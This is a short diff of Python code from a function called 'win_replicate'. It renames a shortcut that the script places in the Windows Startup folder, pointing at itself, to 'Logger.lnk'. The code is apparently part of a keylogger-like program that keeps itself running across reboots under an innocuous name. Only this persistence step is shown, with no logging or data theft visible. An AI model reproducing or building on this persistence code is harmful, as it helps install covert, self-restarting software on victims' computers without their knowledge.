@@ -43,7 +43,7 @@ def win_replicate():
     script_path = os.path.abspath(__file__)
 
     # Create a shortcut to the script in the Startup folder
-    shortcut_path = os.path.join(startup_folder, 'MyScriptName.lnk')
+    shortcut_path = os.path.join(startup_folder, 'Logger.lnk')
     target_path = script_path
     icon_path = script_path # Set the icon path to the script path to use the script icon
     shell = win32com.client.Dispatch("WScript.Shell")
